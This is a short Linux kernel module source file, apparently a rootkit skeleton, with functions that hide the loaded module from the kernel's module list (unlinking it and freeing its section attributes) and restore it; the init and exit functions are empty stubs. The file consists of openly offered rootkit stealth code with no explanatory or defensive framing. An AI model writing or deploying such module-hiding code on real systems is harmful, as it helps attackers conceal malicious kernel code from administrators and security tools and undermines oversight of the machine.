#include <linux/module.h>
#include <linux/slab.h>

#ifndef for_each_process
#include <linux/sched/signal.h>
#endif




void hide_self(void);
void unhide_self(void);


int rk_init(void);
void rk_exit(void);


static struct list_head *prev_module;

void hide_self(void)
{
	while (!mutex_trylock(&module_mutex))
                cpu_relax();
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        kfree(THIS_MODULE->sect_attrs);
        THIS_MODULE->sect_attrs = NULL;
        mutex_unlock(&module_mutex);

	return;
}




void unhide_self(void)
{
        while (!mutex_trylock(&module_mutex))
                cpu_relax();
        list_add(&THIS_MODULE->list, prev_module);
        mutex_unlock(&module_mutex);

	return;
}
int rk_init(void)
{

	return 0;
}

void rk_exit(void)
{

	return;
}

MODULE_LICENSE("GPL");
module_init(rk_init);
module_exit(rk_exit);

